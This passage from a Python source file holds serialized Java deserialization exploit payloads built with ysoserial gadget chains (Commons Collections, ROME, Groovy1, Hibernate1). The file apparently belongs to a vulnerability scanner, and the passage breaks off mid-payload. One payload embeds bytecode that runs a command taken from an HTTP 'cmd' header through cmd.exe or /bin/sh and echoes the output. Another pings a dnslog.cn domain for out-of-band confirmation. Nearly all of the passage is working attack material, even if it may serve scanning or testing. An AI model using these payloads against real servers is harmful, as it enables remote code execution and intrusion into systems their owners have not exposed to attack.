\x00:\x01%\x00<\x01(\x00\x17\x01.\x00B\x011\x00@\x012\x00A\x016\x00C\x001\x00\x00\x00\x8e\x00\x0e\x00\x83\x00\xa5\x00B\x00C\x00\x06\x00\x8c\x00\x9c\x00D\x00E\x00\x07\x00\x95\x00\x93\x00F\x00E\x00\x08\x00\x99\x00\x8f\x00G\x00E\x00\t\x00\xa0\x00\x88\x00H\x00I\x00\n\x00\xad\x00{\x00J\x00K\x00\x0b\x00\xc0\x00h\x00L\x00M\x00\x0c\x00K\x00\xdd\x00N\x00O\x00\x05\x00>\x00\xf0\x00P\x00Q\x00\x04\x00\x07\x01\'\x00R\x00S\x00\x00\x00\x11\x01\x1d\x00T\x00U\x00\x01\x00\x1e\x01\x10\x00V\x00O\x00\x02\x00;\x00\xf3\x00W\x00X\x00\x03\x012\x00\x04\x00Y\x00Z\x00\x00\x00[\x00\x00\x00i\x00\x08\xff\x00>\x00\x05\x07\x00\\\x07\x00]\x07\x00^\x07\x00\n\x01\x00\x00\xfc\x00\x14\x07\x00^\xff\x00\x93\x00\r\x07\x00\\\x07\x00]\x07\x00^\x07\x00\n\x01\x07\x00^\x07\x00_\x07\x00`\x07\x00`\x07\x00`\x07\x00a\x07\x00b\x07\x00c\x00\x008\xff\x00\x07\x00\x05\x07\x00\\\x07\x00]\x07\x00^\x07\x00\n\x01\x00\x00\xff\x00\x05\x00\x00\x00\x00B\x07\x00d\x04\x00\x01\x00e\x00\x00\x00\x02\x00fpt\x00\x04pwnrpw\x01\x00xq\x00~\x00\x0ex'

        
        __bb_CC10_tomcat_echo = b'\xac\xed\x00\x05sr\x00\x11java.util.HashSet\xbaD\x85\x95\x96\xb8\xb74\x03\x00\x00xpw\x0c\x00\x00\x00\x02?@\x00\x00\x00\x00\x00\x01sr\x004org.apache.commons.collections.keyvalue.TiedMapEntry\x8a\xad\xd2\x9b9\xc1\x1f\xdb\x02\x00\x02L\x00\x03keyt\x00\x12Ljava/lang/Object;L\x00\x03mapt\x00\x0fLjava/util/Map;xpsr\x00:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\tWO\xc1n\xac\xab3\x03\x00\x06I\x00\r_indentNumberI\x00\x0e_transletIndex[\x00\n_bytecodest\x00\x03[[B[\x00\x06_classt\x00\x12[Ljava/lang/Class;L\x00\x05_namet\x00\x12Ljava/lang/String;L\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;xp\x00\x00\x00\x00\xff\xff\xff\xffur\x00\x03[[BK\xfd\x19\x15gg\xdb7\x02\x00\x00xp\x00\x00\x00\x01ur\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00xp\x00\x00\x0f\x92\xca\xfe\xba\xbe\x00\x00\x003\x00\xeb\x01\x00\x1eysoserial/Pwner104657360306600\x07\x00\x01\x01\x00\x10java/lang/Object\x07\x00\x03\x01\x00\nSourceFile\x01\x00\x19Pwner104657360306600.java\x01\x00\twriteBody\x01\x00\x17(Ljava/lang/Object;[B)V\x01\x00$org.apache.tomcat.util.buf.ByteChunk\x08\x00\t\x01\x00\x0fjava/lang/Class\x07\x00\x0b\x01\x00\x07forName\x01\x00%(Ljava/lang/String;)Ljava/lang/Class;\x0c\x00\r\x00\x0e\n\x00\x0c\x00\x0f\x01\x00\x0bnewInstance\x01\x00\x14()Ljava/lang/Object;\x0c\x00\x11\x00\x12\n\x00\x0c\x00\x13\x01\x00\x08setBytes\x08\x00\x15\x01\x00\x02[B\x07\x00\x17\x01\x00\x11java/lang/Integer\x07\x00\x19\x01\x00\x04TYPE\x01\x00\x11Ljava/lang/Class;\x0c\x00\x1b\x00\x1c\t\x00\x1a\x00\x1d\x01\x00\x11getDeclaredMethod\x01\x00@(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\x0c\x00\x1f\x00 \n\x00\x0c\x00!\x01\x00\x06<init>\x01\x00\x04(I)V\x0c\x00#\x00$\n\x00\x1a\x00%\x01\x00\x18java/lang/reflect/Method\x07\x00\'\x01\x00\x06invoke\x01\x009(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\x0c\x00)\x00*\n\x00(\x00+\x01\x00\x08getClass\x01\x00\x13()Ljava/lang/Class;\x0c\x00-\x00.\n\x00\x04\x00/\x01\x00\x07doWrite\x08\x001\x01\x00\tgetMethod\x0c\x003\x00 \n\x00\x0c\x004\x01\x00 java/lang/ClassNotFoundException\x07\x006\x01\x00\x13java.nio.ByteBuffer\x08\x008\x01\x00\x04wrap\x08\x00:\x01\x00\x1fjava/lang/NoSuchMethodException\x07\x00<\x01\x00\x04Code\x01\x00\nExceptions\x01\x00\x13java/lang/Exception\x07\x00@\x01\x00\rStackMapTable\x01\x00\x05getFV\x01\x008(Ljava/lang/Object;Ljava/lang/String;)Ljava/lang/Object;\x01\x00\x10getDeclaredField\x01\x00-(Ljava/lang/String;)Ljava/lang/reflect/Field;\x0c\x00E\x00F\n\x00\x0c\x00G\x01\x00\x1ejava/lang/NoSuchFieldException\x07\x00I\x01\x00\rgetSuperclass\x0c\x00K\x00.\n\x00\x0c\x00L\x01\x00\x15(Ljava/lang/String;)V\x0c\x00#\x00N\n\x00J\x00O\x01\x00"java/lang/reflect/AccessibleObject\x07\x00Q\x01\x00\rsetAccessible\x01\x00\x04(Z)V\x0c\x00S\x00T\n\x00R\x00U\x01\x00\x17java/lang/reflect/Field\x07\x00W\x01\x00\x03get\x01\x00&(Ljava/lang/Object;)Ljava/lang/Object;\x0c\x00Y\x00Z\n\x00X\x00[\x01\x00\x10java/lang/String\x07\x00]\x01\x00\x03()V\x0c\x00#\x00_\n\x00\x04\x00`\x01\x00\x10java/lang/Thread\x07\x00b\x01\x00\rcurrentThread\x01\x00\x14()Ljava/lang/Thread;\x0c\x00d\x00e\n\x00c\x00f\x01\x00\x0egetThreadGroup\x01\x00\x19()Ljava/lang/ThreadGroup;\x0c\x00h\x00i\n\x00c\x00j\x01\x00\x07threads\x08\x00l\x0c\x00C\x00D\n\x00\x02\x00n\x01\x00\x13[Ljava/lang/Thread;\x07\x00p\x01\x00\x07getName\x01\x00\x14()Ljava/lang/String;\x0c\x00r\x00s\n\x00c\x00t\x01\x00\x04exec\x08\x00v\x01\x00\x08contains\x01\x00\x1b(Ljava/lang/CharSequence;)Z\x0c\x00x\x00y\n\x00^\x00z\x01\x00\x04http\x08\x00|\x01\x00\x06target\x08\x00~\x01\x00\x12java/lang/Runnable\x07\x00\x80\x01\x00\x06this$0\x08\x00\x82\x01\x00\x07handler\x08\x00\x84\x01\x00\x06global\x08\x00\x86\x01\x00\nprocessors\x08\x00\x88\x01\x00\x0ejava/util/List\x07\x00\x8a\x01\x00\x04size\x01\x00\x03()I\x0c\x00\x8c\x00\x8d\x0b\x00\x8b\x00\x8e\x01\x00\x15(I)Ljava/lang/Object;\x0c\x00Y\x00\x90\x0b\x00\x8b\x00\x91\x01\x00\x03req\x08\x00\x93\x01\x00\x0bgetResponse\x08\x00\x95\x01\x00\tgetHeader\x08\x00\x97\x01\x00\x08Testecho\x08\x00\x99\x01\x00\x07isEmpty\x01\x00\x03()Z\x0c\x00\x9b\x00\x9c\n\x00^\x00\x9d\x01\x00\tsetStatus\x08\x00\x9f\x01\x00\taddHeader\x08\x00\xa1\x01\x00\x03cmd\x08\x00\xa3\x01\x00\x07os.name\x08\x00\xa5\x01\x00\x10java/lang/System\x07\x00\xa7\x01\x00\x0bgetProperty\x01\x00&(Ljava/lang/String;)Ljava/lang/String;\x0c\x00\xa9\x00\xaa\n\x00\xa8\x00\xab\x01\x00\x0btoLowerCase\x0c\x00\xad\x00s\n\x00^\x00\xae\x01\x00\x06window\x08\x00\xb0\x01\x00\x07cmd.exe\x08\x00\xb2\x01\x00\x02/c\x08\x00\xb4\x01\x00\x07/bin/sh\x08\x00\xb6\x01\x00\x02-c\x08\x00\xb8\x01\x00\x11java/util/Scanner\x07\x00\xba\x01\x00\x18java/lang/ProcessBuilder\x07\x00\xbc\x01\x00\x16([Ljava/lang/String;)V\x0c\x00#\x00\xbe\n\x00\xbd\x00\xbf\x01\x00\x05start\x01\x00\x15()Ljava/lang/Process;\x0c\x00\xc1\x00\xc2\n\x00\xbd\x00\xc3\x01\x00\x11java/lang/Process\x07\x00\xc5\x01\x00\x0egetInputStream\x01\x00\x17()Ljava/io/InputStream;\x0c\x00\xc7\x00\xc8\n\x00\xc6\x00\xc9\x01\x00\x18(Ljava/io/InputStream;)V\x0c\x00#\x00\xcb\n\x00\xbb\x00\xcc\x01\x00\x02\\A\x08\x00\xce\x01\x00\x0cuseDelimiter\x01\x00\'(Ljava/lang/String;)Ljava/util/Scanner;\x0c\x00\xd0\x00\xd1\n\x00\xbb\x00\xd2\x01\x00\x04next\x0c\x00\xd4\x00s\n\x00\xbb\x00\xd5\x01\x00\x08getBytes\x01\x00\x04()[B\x0c\x00\xd7\x00\xd8\n\x00^\x00\xd9\x0c\x00\x07\x00\x08\n\x00\x02\x00\xdb\x01\x00\rgetProperties\x01\x00\x18()Ljava/util/Properties;\x0c\x00\xdd\x00\xde\n\x00\xa8\x00\xdf\x01\x00\x13java/util/Hashtable\x07\x00\xe1\x01\x00\x08toString\x0c\x00\xe3\x00s\n\x00\xe2\x00\xe4\x01\x00\x13[Ljava/lang/String;\x07\x00\xe6\x01\x00@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet\x07\x00\xe8\n\x00\xe9\x00`\x00!\x00\x02\x00\xe9\x00\x00\x00\x00\x00\x03\x00\n\x00\x07\x00\x08\x00\x02\x00>\x00\x00\x01/\x00\x08\x00\x05\x00\x00\x00\xf6\x12\n\xb8\x00\x10N-\xb6\x00\x14M-\x12\x16\x06\xbd\x00\x0cY\x03\x12\x18SY\x04\xb2\x00\x1eSY\x05\xb2\x00\x1eS\xb6\x00",\x06\xbd\x00\x04Y\x03+SY\x04\xbb\x00\x1aY\x03\xb7\x00&SY\x05\xbb\x00\x1aY+\xbe\xb7\x00&S\xb6\x00,W*\xb6\x000\x122\x04\xbd\x00\x0cY\x03-S\xb6\x005*\x04\xbd\x00\x04Y\x03,S\xb6\x00,W\xa7\x00\x8d:\x04\x129\xb8\x00\x10N-\x12;\x04\xbd\x00\x0cY\x03\x12\x18S\xb6\x00"-\x04\xbd\x00\x04Y\x03+S\xb6\x00,M*\xb6\x000\x122\x04\xbd\x00\x0cY\x03-S\xb6\x005*\x04\xbd\x00\x04Y\x03,S\xb6\x00,W\xa7\x00H:\x04\x129\xb8\x00\x10N-\x12;\x04\xbd\x00\x0cY\x03\x12\x18S\xb6\x00"-\x04\xbd\x00\x04Y\x03+S\xb6\x00,M*\xb6\x000\x122\x04\xbd\x00\x0cY\x03-S\xb6\x005*\x04\xbd\x00\x04Y\x03,S\xb6\x00,W\xa7\x00\x03\xb1\x00\x02\x00\x00\x00h\x00k\x007\x00\x00\x00h\x00\xb0\x00=\x00\x01\x00B\x00\x00\x00\x17\x00\x03\xf7\x00k\x07\x007\xf7\x00D\x07\x00=\xfd\x00D\x07\x00\x04\x07\x00\x0c\x00?\x00\x00\x00\x04\x00\x01\x00A\x00\n\x00C\x00D\x00\x02\x00>\x00\x00\x00~\x00\x03\x00\x05\x00\x00\x00?\x01M*\xb6\x000N\xa7\x00\x19-+\xb6\x00HM\xa7\x00\x16\xa7\x00\x00:\x04-\xb6\x00MN\xa7\x00\x03-\x12\x04\xa6\xff\xe7,\x01\xa6\x00\x0c\xbb\x00JY+\xb7\x00P\xbf,\x04\xb6\x00V,*\xb6\x00\\\xb0\x00\x01\x00\n\x00\x13\x00\x16\x00J\x00\x01\x00B\x00\x00\x00%\x00\x06\xfd\x00\n\x07\x00X\x07\x00\x0c\x08\xff\x00\x02\x00\x04\x07\x00\x04\x07\x00^\x07\x00X\x07\x00\x0c\x00\x01\x07\x00J\t\x05\r\x00?\x00\x00\x00\x04\x00\x01\x00A\x00\x01\x00#\x00_\x00\x02\x00>\x00\x00\x036\x00\x08\x00\r\x00\x00\x02?*\xb7\x00\xea\x036\x04\xb8\x00g\xb6\x00k\x12m\xb8\x00o\xc0\x00q:\x05\x036\x06\x15\x06\x19\x05\xbe\xa2\x02\x1f\x19\x05\x15\x062:\x07\x19\x07\x01\xa6\x00\x06\xa7\x02\t\x19\x07\xb6\x00uN-\x12w\xb6\x00{\x9a\x00\x0c-\x12}\xb6\x00{\x9a\x00\x06\xa7\x01\xee\x19\x07\x12\x7f\xb8\x00oL+\xc1\x00\x81\x9a\x00\x06\xa7\x01\xdc+\x12\x83\xb8\x00o\x12\x85\xb8\x00o\x12\x87\xb8\x00oL\xa7\x00\x0b:\x08\xa7\x01\xc3\xa7\x00\x00+\x12\x89\xb8\x00o\xc0\x00\x8b:\t\x036\n\x15\n\x19\t\xb9\x00\x8f\x01\x00\xa2\x01\x9e\x19\t\x15\n\xb9\x00\x92\x02\x00:\x0b\x19\x0b\x12\x94\xb8\x00oL+\xb6\x000\x12\x96\x03\xbd\x00\x0c\xb6\x005+\x03\xbd\x00\x04\xb6\x00,M+\xb6\x000\x12\x98\x04\xbd\x00\x0cY\x03\x12^S\xb6\x005+\x04\xbd\x00\x04Y\x03\x12\x9aS\xb6\x00,\xc0\x00^N-\x01\xa5\x00\n-\xb6\x00\x9e\x99\x00\x06\xa7\x00X,\xb6\x000\x12\xa0\x04\xbd\x00\x0cY\x03\xb2\x00\x1eS\xb6\x005,\x04\xbd\x00\x04Y\x03\xbb\x00\x1aY\x11\x00\xc8\xb7\x00&S\xb6\x00,W,\xb6\x000\x12\xa2\x05\xbd\x00\x0cY\x03\x12^SY\x04\x12^S\xb6\x005,\x05\xbd\x00\x04Y\x03\x12\x9aSY\x04-S\xb6\x00,W\x046\x04+\xb6\x000\x12\x98\x04\xbd\x00\x0cY\x03\x12^S\xb6\x005+\x04\xbd\x00\x04Y\x03\x12\xa4S\xb6\x00,\xc0\x00^N-\x01\xa5\x00\n-\xb6\x00\x9e\x99\x00\x06\xa7\x00\x8d,\xb6\x000\x12\xa0\x04\xbd\x00\x0cY\x03\xb2\x00\x1eS\xb6\x005,\x04\xbd\x00\x04Y\x03\xbb\x00\x1aY\x11\x00\xc8\xb7\x00&S\xb6\x00,W\x12\xa6\xb8\x00\xac\xb6\x00\xaf\x12\xb1\xb6\x00{\x99\x00\x18\x06\xbd\x00^Y\x03\x12\xb3SY\x04\x12\xb5SY\x05-S\xa7\x00\x15\x06\xbd\x00^Y\x03\x12\xb7SY\x04\x12\xb9SY\x05-S:\x0c,\xbb\x00\xbbY\xbb\x00\xbdY\x19\x0c\xb7\x00\xc0\xb6\x00\xc4\xb6\x00\xca\xb7\x00\xcd\x12\xcf\xb6\x00\xd3\xb6\x00\xd6\xb6\x00\xda\xb8\x00\xdc\x046\x04-\x01\xa5\x00\n-\xb6\x00\x9e\x99\x00\x08\x15\x04\x9a\x00\x06\xa7\x00\x10,\xb8\x00\xe0\xb6\x00\xe5\xb6\x00\xda\xb8\x00\xdc\x15\x04\x99\x00\x06\xa7\x00\t\x84\n\x01\xa7\xfe\\\x15\x04\x99\x00\x06\xa7\x00\t\x84\x06\x01\xa7\xfd\xdf\xb1\x00\x01\x00_\x00p\x00s\x00A\x00\x01\x00B\x00\x00\x00\xdd\x00\x19\xff\x00\x1a\x00\x07\x07\x00\x02\x00\x00\x00\x01\x07\x00q\x01\x00\x00\xfc\x00\x17\x07\x00c\xff\x00\x17\x00\x08\x07\x00\x02\x00\x00\x07\x00^\x01\x07\x00q\x01\x07\x00c\x00\x00\x02\xff\x00\x11\x00\x08\x07\x00\x02\x07\x00\x04\x00\x07\x00^\x01\x07\x00q\x01\x07\x00c\x00\x00S\x07\x00A\x04\xff\x00\x02\x00\x08\x07\x00\x02\x07\x00\x04\x00\x07\x00^\x01\x07\x00q\x01\x07\x00c\x00\x00\xfe\x00\r\x00\x07\x00\x8b\x01\xff\x00c\x00\x0c\x07\x00\x02\x07\x00\x04\x07\x00\x04\x07\x00^\x01\x07\x00q\x01\x07\x00c\x00\x07\x00\x8b\x01\x07\x00\x04\x00\x00\x02\xfb\x00T.\x02\xfb\x00MQ\x07\x00\xe7)\x0b\x04\x02\x0c\x07\xff\x00\x05\x00\x0b\x07\x00\x02\x07\x00\x04\x00\x07\x00^\x01\x07\x00q\x01\x07\x00c\x00\x07\x00\x8b\x01\x00\x00\xff\x00\x07\x00\x08\x07\x00\x02\x00\x00\x00\x01\x07\x00q\x01\x07\x00c\x00\x00\xfa\x00\x05\x00?\x00\x00\x00\x04\x00\x01\x00A\x00\x01\x00\x05\x00\x00\x00\x02\x00\x06pt\x00\x04Pwnrpw\x01\x00xsr\x00*org.apache.commons.collections.map.LazyMapn\xe5\x94\x82\x9ey\x10\x94\x03\x00\x01L\x00\x07factoryt\x00,Lorg/apache/commons/collections/Transformer;xpsr\x00:org.apache.commons.collections.functors.InvokerTransformer\x87\xe8\xffk{|\xce8\x02\x00\x03[\x00\x05iArgst\x00\x13[Ljava/lang/Object;L\x00\x0biMethodNameq\x00~\x00\t[\x00\x0biParamTypesq\x00~\x00\x08xpur\x00\x13[Ljava.lang.Object;\x90\xceX\x9f\x10s)l\x02\x00\x00xp\x00\x00\x00\x00t\x00\x0enewTransformerur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x00sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x00w\x08\x00\x00\x00\x10\x00\x00\x00\x00xxx'

        # ROME ping 7777777777.rome.omvxwo.dnslog.cn
        __bb_ROME_ping =  b'\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x10w\x08\x00\x00\x00\x02\x00\x00\x00\x02sr\x00(com.sun.syndication.feed.impl.ObjectBean\x82\x99\x07\xdev\x04\x94J\x02\x00\x03L\x00\x0e_cloneableBeant\x00-Lcom/sun/syndication/feed/impl/CloneableBean;L\x00\x0b_equalsBeant\x00*Lcom/sun/syndication/feed/impl/EqualsBean;L\x00\r_toStringBeant\x00,Lcom/sun/syndication/feed/impl/ToStringBean;xpsr\x00+com.sun.syndication.feed.impl.CloneableBean\xdda\xbb\xc53Okw\x02\x00\x02L\x00\x11_ignorePropertiest\x00\x0fLjava/util/Set;L\x00\x04_objt\x00\x12Ljava/lang/Object;xpsr\x00\x1ejava.util.Collections$EmptySet\x15\xf5r\x1d\xb4\x03\xcb(\x02\x00\x00xpsq\x00~\x00\x02sq\x00~\x00\x07q\x00~\x00\x0csr\x00:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\tWO\xc1n\xac\xab3\x03\x00\tI\x00\r_indentNumberI\x00\x0e_transletIndexZ\x00\x15_useServicesMechanismL\x00\x19_accessExternalStylesheett\x00\x12Ljava/lang/String;L\x00\x0b_auxClassest\x00;Lcom/sun/org/apache/xalan/internal/xsltc/runtime/Hashtable;[\x00\n_bytecodest\x00\x03[[B[\x00\x06_classt\x00\x12[Ljava/lang/Class;L\x00\x05_nameq\x00~\x00\x10L\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;xp\x00\x00\x00\x00\xff\xff\xff\xff\x00t\x00\x03allpur\x00\x03[[BK\xfd\x19\x15gg\xdb7\x02\x00\x00xp\x00\x00\x00\x02ur\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00xp\x00\x00\x01\xfe\xca\xfe\xba\xbe\x00\x00\x003\x00\x1c\x01\x00\x1eysoserial/Pwner192168176518600\x07\x00\x01\x01\x00\x10java/lang/Object\x07\x00\x03\x01\x00\nSourceFile\x01\x00\x19Pwner192168176518600.java\x01\x00\x08<clinit>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x11java/lang/Runtime\x07\x00\n\x01\x00\ngetRuntime\x01\x00\x15()Ljava/lang/Runtime;\x0c\x00\x0c\x00\r\n\x00\x0b\x00\x0e\x01\x00"ping ' + bytes(_BANNER, encoding = "utf8") + b'.rome.omvxwo.dnslog.cn\x08\x00\x10\x01\x00\x04exec\x01\x00\'(Ljava/lang/String;)Ljava/lang/Process;\x0c\x00\x12\x00\x13\n\x00\x0b\x00\x14\x01\x00\rStackMapTable\x01\x00@com/sun/org/apache/xalan/internal/xsltc/runtime/AbstractTranslet\x07\x00\x17\x01\x00\x06<init>\x0c\x00\x19\x00\x08\n\x00\x18\x00\x1a\x00!\x00\x02\x00\x18\x00\x00\x00\x00\x00\x02\x00\x08\x00\x07\x00\x08\x00\x01\x00\t\x00\x00\x00$\x00\x03\x00\x02\x00\x00\x00\x0f\xa7\x00\x03\x01L\xb8\x00\x0f\x12\x11\xb6\x00\x15W\xb1\x00\x00\x00\x01\x00\x16\x00\x00\x00\x03\x00\x01\x03\x00\x01\x00\x19\x00\x08\x00\x01\x00\t\x00\x00\x00\x11\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x1b\xb1\x00\x00\x00\x00\x00\x01\x00\x05\x00\x00\x00\x02\x00\x06uq\x00~\x00\x19\x00\x00\x01\xd4\xca\xfe\xba\xbe\x00\x00\x003\x00\x1b\n\x00\x03\x00\x15\x07\x00\x17\x07\x00\x18\x07\x00\x19\x01\x00\x10serialVersionUID\x01\x00\x01J\x01\x00\rConstantValue\x05q\xe6i\xee<mG\x18\x01\x00\x06<init>\x01\x00\x03()V\x01\x00\x04Code\x01\x00\x0fLineNumberTable\x01\x00\x12LocalVariableTable\x01\x00\x04this\x01\x00\x03Foo\x01\x00\x0cInnerClasses\x01\x00%Lysoserial/payloads/util/Gadgets$Foo;\x01\x00\nSourceFile\x01\x00\x0cGadgets.java\x0c\x00\n\x00\x0b\x07\x00\x1a\x01\x00#ysoserial/payloads/util/Gadgets$Foo\x01\x00\x10java/lang/Object\x01\x00\x14java/io/Serializable\x01\x00\x1fysoserial/payloads/util/Gadgets\x00!\x00\x02\x00\x03\x00\x01\x00\x04\x00\x01\x00\x1a\x00\x05\x00\x06\x00\x01\x00\x07\x00\x00\x00\x02\x00\x08\x00\x01\x00\x01\x00\n\x00\x0b\x00\x01\x00\x0c\x00\x00\x00/\x00\x01\x00\x01\x00\x00\x00\x05*\xb7\x00\x01\xb1\x00\x00\x00\x02\x00\r\x00\x00\x00\x06\x00\x01\x00\x00\x003\x00\x0e\x00\x00\x00\x0c\x00\x01\x00\x00\x00\x05\x00\x0f\x00\x12\x00\x00\x00\x02\x00\x13\x00\x00\x00\x02\x00\x14\x00\x11\x00\x00\x00\n\x00\x01\x00\x02\x00\x16\x00\x10\x00\tpt\x00\x04Pwnrpw\x01\x00xsr\x00(com.sun.syndication.feed.impl.EqualsBean\xf5\x8a\x18\xbb\xe5\xf6\x18\x11\x02\x00\x02L\x00\n_beanClasst\x00\x11Ljava/lang/Class;L\x00\x04_objq\x00~\x00\txpvr\x00\x1djavax.xml.transform.Templates\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xpq\x00~\x00\x15sr\x00*com.sun.syndication.feed.impl.ToStringBean\t\xf5\x8eJ\x0f#\xee1\x02\x00\x02L\x00\n_beanClassq\x00~\x00\x1eL\x00\x04_objq\x00~\x00\txpq\x00~\x00!q\x00~\x00\x15sq\x00~\x00\x1dvq\x00~\x00\x02q\x00~\x00\rsq\x00~\x00"q\x00~\x00%q\x00~\x00\rq\x00~\x00\x06q\x00~\x00\x06q\x00~\x00\x06x'
        # Groovy1 calc
        __bb_Groovy1 = b"\xac\xed\x00\x05sr\x002sun.reflect.annotation.AnnotationInvocationHandlerU\xca\xf5\x0f\x15\xcb~\xa5\x02\x00\x02L\x00\x0cmemberValuest\x00\x0fLjava/util/Map;L\x00\x04typet\x00\x11Ljava/lang/Class;xps}\x00\x00\x00\x01\x00\rjava.util.Mapxr\x00\x17java.lang.reflect.Proxy\xe1'\xda \xcc\x10C\xcb\x02\x00\x01L\x00\x01ht\x00%Ljava/lang/reflect/InvocationHandler;xpsr\x00,org.codehaus.groovy.runtime.ConvertedClosure\x10#7\x19\xf7\x15\xdd\x1b\x02\x00\x01L\x00\nmethodNamet\x00\x12Ljava/lang/String;xr\x00-org.codehaus.groovy.runtime.ConversionHandler\x10#7\x1a\xd6\x01\xbc\x1b\x02\x00\x02L\x00\x08delegatet\x00\x12Ljava/lang/Object;L\x00\x0bhandleCachet\x00(Ljava/util/concurrent/ConcurrentHashMap;xpsr\x00)org.codehaus.groovy.runtime.MethodClosure\x11\x0e>\x84\x8f\xbd\xceH\x02\x00\x01L\x00\x06methodq\x00~\x00\txr\x00\x13groovy.lang.Closure<\xa0\xc7f\x16\x12lZ\x02\x00\x08I\x00\tdirectiveI\x00\x19maximumNumberOfParametersI\x00\x0fresolveStrategyL\x00\x03bcwt\x00<Lorg/codehaus/groovy/runtime/callsite/BooleanClosureWrapper;L\x00\x08delegateq\x00~\x00\x0bL\x00\x05ownerq\x00~\x00\x0b[\x00\x0eparameterTypest\x00\x12[Ljava/lang/Class;L\x00\nthisObjectq\x00~\x00\x0bxp\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00pt\x00\x04calcq\x00~\x00\x13ur\x00\x12[Ljava.lang.Class;\xab\x16\xd7\xae\xcb\xcdZ\x99\x02\x00\x00xp\x00\x00\x00\x02vr\x00\x13[Ljava.lang.String;\xad\xd2V\xe7\xe9\x1d{G\x02\x00\x00xpvr\x00\x0cjava.io.File\x04-\xa4E\x0e\r\xe4\xff\x03\x00\x01L\x00\x04pathq\x00~\x00\txppt\x00\x07executept\x00\x08entrySetvr\x00\x12java.lang.Override\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00xp"


        # Hibernate1 calc
        __bb_Hibernate1= b'\xac\xed\x00\x05sr\x00\x11java.util.HashMap\x05\x07\xda\xc1\xc3\x16`\xd1\x03\x00\x02F\x00\nloadFactorI\x00\tthresholdxp?@\x00\x00\x00\x00\x00\x0cw\x08\x00\x00\x00\x02\x00\x00\x00\x02sr\x00#org.hibernate.engine.spi.TypedValue\x87\x88\x14\xb2\x19\xa1\xe7<\x02\x00\x02L\x00\x04typet\x00\x19Lorg/hibernate/type/Type;L\x00\x05valuet\x00\x12Ljava/lang/Object;xpsr\x00 org.hibernate.type.ComponentTypeK-\x19\x051\xa2\xc3u\x02\x00\x0cZ\x00\x12hasNotNullPropertyZ\x00\x05isKeyI\x00\x0cpropertySpanL\x00\x0fcanDoExtractiont\x00\x13Ljava/lang/Boolean;[\x00\x07cascadet\x00([Lorg/hibernate/engine/spi/CascadeStyle;L\x00\x11componentTuplizert\x001Lorg/hibernate/tuple/component/ComponentTuplizer;L\x00\nentityModet\x00\x1aLorg/hibernate/EntityMode;[\x00\x0bjoinedFetcht\x00\x1a[Lorg/hibernate/FetchMode;[\x00\rpropertyNamest\x00\x13[Ljava/lang/String;[\x00\x13propertyNullabilityt\x00\x02[Z[\x00\rpropertyTypest\x00\x1a[Lorg/hibernate/type/Type;L\x00\ttypeScopet\x00*Lorg/hibernate/type/TypeFactory$TypeScope;xr\x00\x1forg.hibernate.type.AbstractType\xfa\x0c\xc3\xb4\x9fB\xddA\x02\x00\x00xp\x00\x00\x00\x00\x00\x01ppsr\x003org.hibernate.tuple.component.PojoComponentTuplizer\xb5\x9eS\x92lw\x08\xfa\x02\x00\x04L\x00\x0ecomponentClasst\x00\x11Ljava/lang/Class;L\x00\toptimizert\x000Lorg/hibernate/bytecode/spi/ReflectionOptimizer;L\x00\x0cparentGettert\x00\x1fLorg/hibernate/property/Getter;L\x00\x0cparentSettert\x00\x1fLorg/hibernate/property/Setter;xr\x007org.hibernate.tuple.component.AbstractComponentTuplizer\xcf\x12Xb\xae\t\xe6t\x02\x00\x05Z\x00\x12hasCustomAccessorsI\x00\x0cpropertySpan[\x00\x07getterst\x00 [Lorg/hibernate/property/Getter;L\x00\x0cinstantiatort\x00"Lorg/hibernate/tuple/Instantiator;[\x00\x07setterst\x00 [Lorg/hibernate/property/Setter;xp\x00\x00\x00\x00\x00ur\x00 [Lorg.hibernate.property.Getter;\xf8\x96\xfc\xa9\x8d\xfb\xe3{\x02\x00\x00xp\x00\x00\x00\x01sr\x008org.hibernate.property.BasicPropertyAccessor$BasicGetter\xe7\xfc\x1a;\x98\xddq\xbc\x02\x00\x02L\x00\x05clazzq\x00~\x00\x13L\x00\x0cpropertyNamet\x00\x12Ljava/lang/String;xpvr\x00:com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\tWO\xc1n\xac\xab3\x03\x00\x08I\x00\r_indentNumberI\x00\x0e_transletIndexZ\x00\x15_useServicesMechanismL\x00\x0b_auxClassest\x00;Lcom/sun/org/apache/xalan/internal/xsltc/runtime/Hashtable;[\x00\n_bytecodest\x00\x03[[B[\x00\x06_classt\x00\x12[Ljava/lang/Class;L\x00\x05_nameq\x00~\x00\x1fL\x00\x11_outputPropertiest\x00\x16Ljava/util/Properties;xpt\x00\x10outputPropertiesppppppppppur\x00\x1a[Lorg.hibernate.type.Type;~\xaf\xab\xa1\xe4\x95a\x9a\x02\x00\x00xp\x00\x00\x00\x01q\x00~\x00\x11psq\x00~\x00!\x00\x00\x00\x00\xff\xff\xff\xff\x00pur\x00\x03[[BK\xfd\x19\x15gg\xdb7\x02\x00\x00xp\x00\x00\x00\x02ur\x00\x02[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02\x00\x00xp\x00\x00\x02\x01\xca\xfe\xba\xbe\x00\x00\x002\x00\x1d\x01\x00\x1eysoserial/Pwner111445343048100\x07\x00\x17\x01\x00\x10java/lang/Object\x07\x00\x03\x01\x00\nSourceFile\